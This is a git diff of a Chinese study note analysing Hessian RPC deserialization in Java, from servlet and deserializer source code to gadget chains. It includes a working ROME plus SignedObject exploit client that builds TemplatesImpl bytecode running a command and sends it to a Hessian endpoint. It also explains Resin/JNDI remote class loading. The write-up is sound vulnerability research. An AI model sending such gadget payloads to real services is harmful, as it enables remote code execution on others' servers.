@@ -41,7 +41,7 @@ RPC的主要功能目标是让构建**分布式应用**更加容易
 
 ![image-20230409194751589](../.gitbook/assets/image-20230409194751589.png)
 
-## Hessian ⚔ Build-in
+## Hessian ⚔ Native
 
 `Hessian`反序列化和原生反序列化有啥区别呢？
 
@@ -109,6 +109,10 @@ ois.readObject();
 实际上，`Hessian`序列化的类甚至可以不需要实现`Serializable`接口
 
 🎃慢慢看下去咯
+
+> 下面的分析基于Hessian4.x，默认的序列化器为UnsafeSerializer（使用unsafe在内存层面直接恢复对象）
+>
+> 而Hessian3.x，默认的序列化器为JavaSerializer（调用构造器创建对象和使用反射恢复字段）
 
 # 0x02 Hessian At Your Service
 
@@ -224,7 +228,7 @@ public interface Greeting {
 
 Spring-Web 包提供了 `org.springframework.remoting.caucho.HessianServiceExporter` 用来暴露远程调用的接口和实现类。使用该类 export 的 Hessian Service 可以被任何 Hessian Client 访问
 
-# 0x03 Deep Source
+# 0x03 Dive Into Source
 
 ## Server
 
@@ -238,115 +242,179 @@ import java.util.HashMap;
 
 @WebServlet(value = "/hessian", loadOnStartup = 1)
 public class Hello extends HessianServlet implements Greeting {
+    @Override
     public String sayHi(HashMap o) {
         return "Hi" + o.toString();
     }
 }
 ```
 
-`HessianServlet`是`HttpServlet`的子类
+`HessianServlet`是`HttpServlet`的子类，那就存在Servlet的生命周期三个阶段：初始化（init）、运行（service）、销毁（destroy）
 
-![image-20230315172736162](../.gitbook/assets/image-20230315172736162.png)
+### init
 
-* `_homeAPI`：调用类的接口Class
-* `_homeImpl`：接口的实现类的实例
-* `_serializerFactory`：序列化工厂
+首先是初始化`HessianServlet`
+
+![image-20231020185348063](./../.gitbook/assets/image-20231020185348063.png)
+
+* `_homeAPI`：被调用的接口类
+* `_homeImpl`：接口实现类的实例
+* `_serializerFactory`：序列化器工厂
 
 `loadServlet` => `initServlet` => `HessianServlet#init`
 
-![image-20230315173535884](../.gitbook/assets/image-20230315173535884.png)
+![image-20231020191003443](./../.gitbook/assets/image-20231020191003443.png)
 
 上面的初始化参数是通过xml配置或注解传入给`HessianServlet`
 
 我们这里没有配置初始化参数，将`this`（Hello对象）赋值给`_homeImpl`，`_homeAPI=_homeImpl.getClass()`
 
-`_objectAPI`和`_objectImpl`均为null
+`_objectAPI`和`_objectImpl`均为null，`_homeSkeleton`直接赋值给`_objectSkeleton`
 
-![image-20230315173831927](../.gitbook/assets/image-20230315173831927.png)
+![image-20231020191520001](./../.gitbook/assets/image-20231020191520001.png)
 
-别忘了`HessianServlet`是`HttpServlet`的子类，当请求到来时会触发`Servlet`的`service`方法
+`HessianSkeleton`是`AbstractSkeleton`的子类，对Hessian提供的服务进行封装。
 
-![image-20230315174257577](../.gitbook/assets/image-20230315174257577.png)
+`AbstractSkeleton`实例化时将接口中的public方法和方法名保存在`_methodMap`，以及一些方法名的变体，如`方法名__参数个数`、`方法名_参数1类型_参数2类型...`。这里传入的是`this`，所以顺带把`Hello`从父类继承到的方法也放进去了。
 
-序列化工厂默认是`SerializerFactory`
+![image-20231020200847229](./../.gitbook/assets/image-20231020200847229.png)
 
-进入`HessianServlet#invoke`
+### service
 
-![image-20230315174335277](../.gitbook/assets/image-20230315174335277.png)
+当请求到来时会触发`Servlet`的`service`方法
 
-根据`objectId`是否空决定调用`_objectSkeleton`还是`_homeSkeleton`的invoke
+![image-20231020192639880](./../.gitbook/assets/image-20231020192639880.png)
 
-和RMI一样，服务端也是采用了`Skeleton`代理的设计概念
+获取序列化器工厂，创建`SerializerFactory`实例
 
-（`HessianSkeleton#invoke`）
+![image-20231020192911162](./../.gitbook/assets/image-20231020192911162.png)
 
-![image-20230316143617594](../.gitbook/assets/image-20230316143617594.png)
+![image-20231020195052941](./../.gitbook/assets/image-20231020195052941.png)
+
+看一下这个`_isEnableUnsafeSerializer`开关是怎么打开的
+
+```java
+private boolean _isEnableUnsafeSerializer
+    = (UnsafeSerializer.isEnabled()
+        && UnsafeDeserializer.isEnabled());
+```
+
+`UnsafeSerializer`的静态代码块判断是否开启`Unsafe`序列化器
+
+![image-20231020193331834](./../.gitbook/assets/image-20231020193331834.png)
+
+其实就是简单通过反射找到`sun.misc.Unsafe`的`theUnsafe`成员（`Unsafe`是单例模式，静态代码块对自身进行实例化，并放到`theUnsafe`属性。由于只实例化一次，对外提供`getUnsafe`方法来获取自身的实例，但不允许非系统类调用）
+
+可以通过设置全局属性`com.caucho.hessian.unsafe=false`来关闭这个序列化器。一般`_isEnabled`应该是开启的。
+
+回到`HessianServlet#invoke`，和RMI一样，服务端也是采用了`Skeleton`代理的设计理念。
+
+最后调用的是`_homeSkeleton#invoke`
+
+![image-20231020195506066](./../.gitbook/assets/image-20231020195506066.png)
+
+![image-20231020195442192](./../.gitbook/assets/image-20231020195442192.png)
 
 判断了使用哪种协议进行数据交互（hessian/hessian2/混用）
 
-📌注意看这里`in`由`HessianFactory#createHessianInput`获取，也就得到一个`HessianInput`
+并将原本的`ServletRequest`输入流和`ServletResponse`输出流封装为`HessianInput`和`HessianOutput`
 
-`out`由`HessianFactory#createHessian2Output`获取，得到`Hessian2Output`
-
-后面的`readObject`和`writeObject`就是基于这两个输入输出对象
+后面的`readObject`和`writeObject`就是基于这两个输入输出对象。
 
 创建好输入输出流后，设置其序列化器工厂，继续`invoke`
 
-![image-20230316143800856](../.gitbook/assets/image-20230316143800856.png)
+这里看到多出了一个`_service`对象，正是我们的`Hello`对象，它是`HessianSkeleton`的属性（`init`构造Skeleton的时候传进来的`this`）
 
-这里看到多出了一个`_service`对象，正是我们的`Hello`对象，它是`HessianSkeleton`的属性
+`_service`即提供方法的调用对象
 
-`HessianSkeleton`是`AbstractSkeleton`的子类，对Hessian提供的服务进行封装
+![image-20231020195909370](./../.gitbook/assets/image-20231020195909370.png)
 
-![image-20230315231824105](../.gitbook/assets/image-20230315231824105.png)
+```java
+public void invoke(Object service,
+                   AbstractHessianInput in,
+                   AbstractHessianOutput out)
+    throws Exception
+{
+    // ...
+    String methodName = in.readMethod();
+    int argLength = in.readMethodArgLength();
 
-`AbstractSkeleton`初始化时将接口中的方法和方法名（实际上还对方法名进行了一些变换，如方法名__参数类型长度）保存在`_methodMap`
+    Method method;
 
-`HessianSkeleton`初始化时将实现类对象保存到`_service`成员中
+    method = getMethod(methodName + "__" + argLength);
 
-![image-20230315231948664](../.gitbook/assets/image-20230315231948664.png)
+    if (method == null)
+        method = getMethod(methodName);
+	// ...
+    if (method == null) {
+        out.writeFault("NoSuchMethodException",
+                       escapeMessage("The service has no method named: " + in.getMethod()),
+                       null);
+        out.close();
+        return;
+    }
 
-回到`HessianSkeleton#invoke`
+    Class<?> []args = method.getParameterTypes();
 
-![image-20230316144825933](../.gitbook/assets/image-20230316144825933.png)
+    if (argLength != args.length && argLength >= 0) {
+        out.writeFault("NoSuchMethod",
+                       escapeMessage("method " + method + " argument length mismatch, received length=" + argLength),
+                       null);
+        out.close();
+        return;
+    }
 
-读取方法名（methodName），查找调用方法（getMethod）
+    Object []values = new Object[args.length];
 
-![image-20230316144716206](../.gitbook/assets/image-20230316144716206.png)
+    for (int i = 0; i < args.length; i++) {
+        // XXX: needs Marshal object
+        values[i] = in.readObject(args[i]);
+    }
 
-根据参数类型**反序列化参数值**（对，就是这里调用了`HessianInput#readObject`），对`service`调用`invoke`，将调用结果写到返回流中。
+    Object result = null;
+
+    try {
+        result = method.invoke(service, values);
+    } //...
+}
+```
+
+读取方法名（`methodName`），查找调用方法（`getMethod`，从`_methodMap`获取），根据Method对象获取参数个数。
+
+接着从输入流反序列化参数，传入的是参数类型（`HessianInput#readObject(Class<?> cl)`）
+
+最后调用方法，并写到输出流中进行序列化。
 
 总结：
 
-* `HessianServlet`初始化时获取到服务接口和实例对象
+* `HessianServlet`初始化时获取到服务接口和实例对象，将接口中的方法注册到`_methodMap`
 * 作为一个`Servlet`，请求到来时触发`service`方法，准备远程方法调用`invoke`
-* `HessianSkeleton`根据请求流读取方法名、方法参数，调用方法后将结果写到返回流中
+* `HessianSkeleton`根据请求流读取方法名、方法参数，在`_methodMap`中查找方法
+* 对方法参数进行反序列化，调用方法后将结果写到返回流进行序列化。
 
-## Deserialize
+### deserialize
 
-跟进`HessianInput#readObject`
+跟进上文的`HessianInput#readObject`，在这里对方法参数进行反序列化。
+
+![image-20231020212052771](./../.gitbook/assets/image-20231020212052771.png)
 
 `reader = _serializerFactory.getDeserializer(cl);`获取反序列化器
 
-![image-20230409214657119](../.gitbook/assets/image-20230409214657119.png)
+![image-20231020212223037](./../.gitbook/assets/image-20231020212223037.png)
 
 试图从缓存中获取，`loadDeserializer`获取后放入缓存
 
-![image-20230409220037232](../.gitbook/assets/image-20230409220037232.png)
+![image-20231020212518552](./../.gitbook/assets/image-20231020212518552.png)
 
-根据方法参数类型来决定使用哪个反序列化器，这里返回`MapDeserializer`
+根据调用方法的参数类型来决定使用哪个反序列化器，这里返回`MapDeserializer`
 
-接着执行`reader.readMap(this);`
+（`MapDeserializer`的构造函数把传入的参数类型赋值给了`_type`，`_type`就是远程调用方法的参数类型，并且获取了`_type`的无参构造器`_ctor`）
+
+接着执行`MapDeserializer#readMap(HessianInput in);`
 
 ```java
-Map map;
-if (_type == null)
-    map = new HashMap();
-else if (_type.equals(Map.class))
-    map = new HashMap();
-else if (_type.equals(SortedMap.class))
-    map = new TreeMap();
 // ....
+map = (Map) _ctor.newInstance();
 while (! in.isEnd()) {
     map.put(in.readObject(), in.readObject());  // in: HessianInput
 }
@@ -354,29 +422,71 @@ while (! in.isEnd()) {
 
 对键值对分别反序列化，再放入`map`
 
-根据`MapDeserializer`的`_type`决定使用`HashMap`还是`TreeMap`（`MapDeserializer`的构造函数把传入的参数类型赋值给了`_type`，实际上`_type`就是远程调用方法的参数类型）
-
 👉注意看，**漏洞source点就在这了**
 
-`map.put`对于`HashMap`会触发`key.hashCode()`，而对于`TreeMap`会触发`key.compareTo()`
+`map.put`对于`HashMap`会触发`key.hashCode()、key.equals(k)`，而对于`TreeMap`会触发`key.compareTo()`
 
-经过之前反序列化的~~bei du da~~（学习），应该能很快反应出来（`CC6`、`ROME`都用到了`hashCode`）
+经过之前反序列化的~~du da~~（学习），应该能很快反应出来（`CC6`、`ROME`都用到了`hashCode`）
 
-那我们目标就明确了
+那我们目标就明确了：
 
 🚩**以Map为载体，构造恶意的方法调用参数，服务端会解析请求中的方法参数，触发`hashCode`、`compareTo`方法**
 
-💦限制：远程方法接口的参数要有`Map`类型
+💦限制：远程方法接口的参数要有`Map`类型，后面看看能不能绕过
 
-现在回答上面的问题，为什么`Hessian`反序列化不会执行类的`readObject`方法？那它是如何反序列化出一个对象的？
+现在回答上面的问题，为什么`Hessian`反序列化不会执行类的`readObject`方法？那它是如何得到一个对象的？
 
-上面反序列化`Person`时，默认反序列化器为`UnsafeDeserializer`
+我们看看当MapEntry的值为`Person`对象时`Hessian`是怎么处理的。
 
-![image-20230409215503556](../.gitbook/assets/image-20230409215503556.png)
+`HessianInput#readObject()`
 
-这里直接获取了这个类的`Fields`，再赋值给初始化的`Person`对象，所以就没有触发我们自定义的`readObject`了。
+Map的元素类型未知，只能从输入流中读取任意对象。当然输入流中有对象类型的标记位。
 
-![image-20230409215859274](../.gitbook/assets/image-20230409215859274.png)
+![image-20231020214202150](./../.gitbook/assets/image-20231020214202150.png)
+
+依旧获取到`M`，看来`Hessian`把普通类对象当成`Map`来处理了
+
+![image-20231020214526736](./../.gitbook/assets/image-20231020214526736.png)
+
+![image-20231020214827450](./../.gitbook/assets/image-20231020214827450.png)
+
+`getDeserializer(type)`首先也是调用到`loadDeserializer`，根据类型获取反序列化器，这里匹配不到预置类型，只能获取默认的反序列化器
+
+`SerializerFactory#getDefaultDeserializer`
+
+![image-20231020215507685](./../.gitbook/assets/image-20231020215507685.png)
+
+默认反序列化器为`UnsafeDeserializer`，在其构造函数里，会对类成员分配成员的反序列化器，并放入`HashMap<String,FieldDeserializer2> _fieldMap`
+
+![image-20231020215905637](./../.gitbook/assets/image-20231020215905637.png)
+
+和原生反序列化一样，会跳过`static`和`transient`修饰的字段
+
+回到`UnsafeDeserializer#readMap`，先创建了一个实例对象，再对这个实例对象进行操作
+
+![image-20231020220135720](./../.gitbook/assets/image-20231020220135720.png)
+
+这里的`instantiate`就是利用的老朋友`Unsafe`在内存层面直接开辟出一个对象的空间
+
+```java
+protected Object instantiate() throws Exception {
+    return _unsafe.allocateInstance(_type);
+}
+```
+
+接着从输入流里读取字段名，`_fieldMap`中获取对应的字段反序列化器，再对obj进行操作
+
+![image-20231020220548407](./../.gitbook/assets/image-20231020220548407.png)
+
+![image-20231020220842054](./../.gitbook/assets/image-20231020220842054.png)
+
+`FieldDeserializer2FactoryUnsafe`内置了一堆基本类型的反序列化器，大都是直接从输入流读取的数据就是字段值
+
+接着又是熟悉的操作`_unsafe.putObject(obj, _offset, value);`修改对象在内存中字段偏移量处的值
+
+因此就没有触发我们自定义的`readObject`了。
+
+
 
 ## Client
 
@@ -394,74 +504,101 @@ System.out.println(greet.sayHi(o));
 
 `HessianProxyFactory#create`返回一个代理对象
 
-![image-20230316083955147](../.gitbook/assets/image-20230316083955147.png)
+![image-20231020231457569](./../.gitbook/assets/image-20231020231457569.png)
 
 所以无论调用啥方法都会走到`HessianProxy#invoke`方法，
 
-![image-20230316142440945](../.gitbook/assets/image-20230316142440945.png)
+![image-20231020232019965](./../.gitbook/assets/image-20231020232019965.png)
 
-获取了方法名和方法参数类型，将方法和方法名放入`_mangleMap`
+获取了方法名和方法参数类型，将方法和方法名放入`_mangleMap`，下次调用会首先从`_mangleMap`获取方法名
 
-![image-20230316142604777](../.gitbook/assets/image-20230316142604777.png)
+![image-20231020232531204](./../.gitbook/assets/image-20231020232531204.png)
 
 发送请求获取连接对象，读取协议标志`code`，根据协议标志选择使用`Hessian/Hessian2`读取，最终断开连接。
 
-![image-20230316084556015](../.gitbook/assets/image-20230316084556015.png)
+`sendRequest`里除了建立网络连接外，通过`HessianOutput#call`来序列化方法调用参数（`HessianOutput#writeObject`）
 
+![image-20231021210313099](./../.gitbook/assets/image-20231021210313099.png)
 
+根据参数类型获取对应的序列化器。和获取反序列化器一样，这里匹配不到预置类型，只能获取默认的序列化器`UnsafeSerializer`
 
-![image-20230316145831045](../.gitbook/assets/image-20230316145831045.png)
+![image-20231021212016559](./../.gitbook/assets/image-20231021212016559.png)
 
-执行`Hessian2Input#readObject`
+只要开启`_isAllowNonSerializable`，没有实现`Serializable`接口的类也能序列化！
 
-![image-20230316154716819](../.gitbook/assets/image-20230316154716819.png)
+这也是和原生反序列化的重大区别之一。
 
-## Non-Trivial Details
+`UnsafeSerializer`的构造函数中使用`introspect()`自省序列化的类
 
-* 序列化时，先获取序列化器，这时候就会判断该类是否实现`Serializable`接口。但若开启`_isAllowNonSerializable`就没有这个限制
+![image-20231021211111215](./../.gitbook/assets/image-20231021211111215.png)
 
-![](../.gitbook/assets/image-20230316084946919.png)
+看到这里序列化也跳过了`static`和`transient`修饰的字段
 
-* 序列化时通过反射获取Field的值，若属性被static或transient修饰，不参与序列化
+同样为每个字段分配其序列化器
 
-![image-20230316085450692](../.gitbook/assets/image-20230316085450692.png)
+![image-20231021211230636](./../.gitbook/assets/image-20231021211230636.png)
+
+# 0x04 Exploitation
+
+由上分析，我们可得Hessian反序列化有如下特点：
+
+* 只要开启`_isAllowNonSerializable`，未实现`Serializable`接口的类也能序列化
+* 和原生反序列化一样，`static`和`transient`修饰的类不会被序列化和反序列化
+* `source`不在`readObject`，而是利用`Map`类反序列化时会执行`put`操作，触发`HashMap->key.hashCode()、key.equals(k)`或`TreeMap->key.compareTo()`
+
+> 上帝为`Hessian`关上了`readObject`这扇门，但同时也为它开启了`AllowNonSerializable`这扇窗
+
+若目标RPC服务暴露出去的接口方法不接收Map类型参数，我们可以找远程对象从`HessianServlet`及其父类继承得到的方法。
+
+看哪些方法接收Object或Map类型参数，在客户端的接口中添加方法即可，如
+
+```java
+public void setHome(Object home)
+public void setObject(Object object)
+```
 
 Hessian可以配合以下来利用：
 
-- Rome
-- XBean
-- Resin
-- SpringPartiallyComparableAdvisorHolder
-- SpringAbstractBeanFactoryPointcutAdvisor
+- Rome   <- hashCode
+- XBean  <- equals
+- Resin  <- equals
+- Goovy  <- compareTo
+- SpringPartiallyComparableAdvisorHolder    <- equals
+- SpringAbstractBeanFactoryPointcutAdvisor  <- equals
 
-# 0x04 SignedObject 反序二逝
+# 0x05 ROME + SignedObject
 
-Rome利用链中的`TemplatesImpl`由于其`_tfactory`被`transient`修饰，在Hessian中无法进行序列化。为啥之前可以打出来？因为`TemplatesImpl`重写了`readObject`方法，在`readObject`中给`_tfactory`赋值了，而在`Hessian`中反序列化后`_tfactory`就为null（`TemplatesImpl`那条链的`defineTransletClasses`要求`_tfactory`不为空，否则抛出异常）
+Rome利用链中的`TemplatesImpl`由于其`_tfactory`被`transient`修饰，在`Hessian`中无法进行序列化。
 
-![image-20230409140827564](../.gitbook/assets/image-20230409140827564.png)
+> 这里插一句为啥之前可以打出来
+>
+> `TemplatesImpl`重写了`readObject`方法，在`readObject`中给`_tfactory`赋值了，而`Hessian`中序列化和反序列化中都不会处理`transient`修饰的字段
+>
+> ![image-20231021215620358](./../.gitbook/assets/image-20231021215620358.png)
+>
+> （`TemplatesImpl`那条链的`defineTransletClasses`要求`_tfactory`不为空，否则抛出异常）
 
 Introducing~ `java.security.SignedObject#getObject`
 
 ```java
 public final class SignedObject implements Serializable {
-        public SignedObject(Serializable object, PrivateKey signingKey,
-                        Signature signingEngine)
-        throws IOException, InvalidKeyException, SignatureException {
-            // creating a stream pipe-line, from a to b
-            ByteArrayOutputStream b = new ByteArrayOutputStream();
-            ObjectOutput a = new ObjectOutputStream(b);
+    public SignedObject(Serializable object, PrivateKey signingKey,
+                        Signature signingEngine) {
+        // creating a stream pipe-line, from a to b
+        ByteArrayOutputStream b = new ByteArrayOutputStream();
+        ObjectOutput a = new ObjectOutputStream(b);
 
-            // write and flush the object content to byte array
-            a.writeObject(object);
-            a.flush();
-            a.close();
-            this.content = b.toByteArray();
-            b.close();
+        // write and flush the object content to byte array
+        a.writeObject(object);
+        a.flush();
+        a.close();
+        this.content = b.toByteArray();
+        b.close();
 
-            // now sign the encapsulated object
-            this.sign(signingKey, signingEngine);
+        // now sign the encapsulated object
+        this.sign(signingKey, signingEngine);
     }
-        public Object getObject()
+    public Object getObject()
         throws IOException, ClassNotFoundException
     {
         // creating a stream pipe-line, from b to a
@@ -481,12 +618,14 @@ public final class SignedObject implements Serializable {
 
 ```java
 import com.caucho.hessian.client.HessianProxyFactory;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.syndication.feed.impl.EqualsBean;
-import com.sun.syndication.feed.impl.ObjectBean;
 import com.sun.syndication.feed.impl.ToStringBean;
 import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtConstructor;
+import org.taco.hessian.service.Greeting;
 
 import javax.management.BadAttributeValueExpException;
 import javax.xml.transform.Templates;
@@ -503,77 +642,104 @@ public class Client {
         field.set(obj, newValue);
     }
 
+    public static byte[] getPayload() throws Exception{
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.makeClass("a");
+        CtClass superClazz = pool.get(AbstractTranslet.class.getName());
+        clazz.setSuperclass(superClazz);
+        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
+        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
+        clazz.addConstructor(constructor);
+        return clazz.toBytecode();
+    }
+
     public static void main(String[] args) throws Exception {
         String url = "http://localhost:8080/hessian";
 
         HessianProxyFactory factory = new HessianProxyFactory();
         Greeting greet = (Greeting) factory.create(Greeting.class, url);
 
-        byte[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();
         TemplatesImpl obj = new TemplatesImpl();
-        setFieldValue(obj, "_bytecodes", new byte[][]{code});
+        setFieldValue(obj, "_bytecodes", new byte[][]{getPayload()});
         setFieldValue(obj, "_name", "p4d0rn");
-        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
         ToStringBean bean = new ToStringBean(Templates.class, obj);
 
-        // BadAttributeValueExpException构造函数会触发toString()
         BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1);
         setFieldValue(badAttributeValueExpException, "val", bean);
-        
+
         KeyPairGenerator keyPairGenerator;
         keyPairGenerator = KeyPairGenerator.getInstance("DSA");
         keyPairGenerator.initialize(1024);
         KeyPair keyPair = keyPairGenerator.genKeyPair();
         PrivateKey privateKey = keyPair.getPrivate();
         Signature signingEngine = Signature.getInstance("DSA");
-
         SignedObject signedObject = new SignedObject(badAttributeValueExpException, privateKey, signingEngine);
 
         ToStringBean toStringBean = new ToStringBean(SignedObject.class, signedObject);
-        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
-        ObjectBean fakeBean = new ObjectBean(String.class, "p4d0rn");  // 传入无害的String.class
+        EqualsBean equalsBean = new EqualsBean(String.class, "p4d0rn");
         HashMap map = new HashMap();
-        map.put(fakeBean, 1);  // 注意put的时候也会执行hash
-        setFieldValue(fakeBean, "_equalsBean", equalsBean);
+        map.put(equalsBean, 1);
 
-        greet.sayHi(map);
+        setFieldValue(equalsBean, "_beanClass", ToStringBean.class);
+        setFieldValue(equalsBean, "_obj", toStringBean);
+
+        greet.setHome(map);
     }
 }
 ```
 
-# 0x05 Resin
+# 0x06 Resin
 
 `HashMap#put`会调用`key.equals(k)`，对比两个对象
 
 `com.sun.org.apache.xpath.internal.objects.XString#equals`
 
-![image-20230316160536510](../.gitbook/assets/image-20230316160536510.png)
+![image-20231021230622144](./../.gitbook/assets/image-20231021230622144.png)
 
 `QName`是`Resin`对上下文`Context`的一种封装，它的`toString`方法会调用其封装类的`composeName`方法获取复合上下文的名称。
 
-`com.caucho.naming.QName#toString`
+看类描述就知道这类不简单了
 
-![image-20230316161821833](../.gitbook/assets/image-20230316161821833.png)
+> Represents a parsed JNDI name.
+>
+> public class QName implements Name{}
 
 `javax.naming.spi.ContinuationContext#composeName `
 
-![image-20230316162023793](../.gitbook/assets/image-20230316162023793.png)
+![image-20231021231800625](./../.gitbook/assets/image-20231021231800625.png)
 
-跟进`getTargetContext`，调用 `NamingManager#getContext`
+跟进`getTargetContext`，调用`NamingManager#getContext`
 
-![image-20230316162122677](../.gitbook/assets/image-20230316162122677.png)
+![image-20231021231913681](./../.gitbook/assets/image-20231021231913681.png)
 
-跟进`NamingManager#getContext`
+跟进`NamingManager#getContext` -> `NamingManager#getObjectFactoryFromReference`
 
-![image-20230316162238539](../.gitbook/assets/image-20230316162238539.png)
+首先试图通过当前上下文类加载器加载
 
-`getObjectFactoryFromReference`
+![image-20231021232508678](./../.gitbook/assets/image-20231021232508678.png)
 
-![image-20230316162541794](../.gitbook/assets/image-20230316162541794.png)
+```java
+public Class<?> loadClassWithoutInit(String className) throws ClassNotFoundException {
+    return loadClass(className, false, getContextClassLoader());
+}
+Class<?> loadClass(String className, boolean initialize, ClassLoader cl)
+    throws ClassNotFoundException {
+    Class<?> cls = Class.forName(className, initialize, cl);
+    return cls;
+}
+```
 
-使用URLClassLoader进行加载
+这里的上下文类加载器是通过`Thread.currentThread().getContextClassLoader();`或`ClassLoader.getSystemClassLoader();`获取的
 
-![image-20230316162804011](../.gitbook/assets/image-20230316162804011.png)
+显然会找不到我们指定的类，再从Reference获取codebase。
+
+高版本JDK默认不开启codebase（`trustURLCodebase`为`false`），这里也就无法通过URLClassLoader加载远程类了。
+
+![image-20231022103658728](./../.gitbook/assets/image-20231022103658728.png)
+
+对于低版本JDK，就少了codebase这部分判断，直接远程加载类。
+
+![image-20231022104022051](./../.gitbook/assets/image-20231022104022051.png)
 
 ```java
 import com.caucho.naming.QName;
@@ -609,6 +775,14 @@ public class Client {
 }
 ```
 
+这里要构造可用的payload涉及到hash构造，先放着📌
+
+# Spring AOP
+
+# Spring Context + AOP
+
 # Reference
 
-[Hessian 反序列化知一二 | 素十八](https://su18.org/post/hessian/)
+* [Hessian 反序列化知一二 | 素十八](https://su18.org/post/hessian/)
+
+* https://paper.seebug.org/1131/
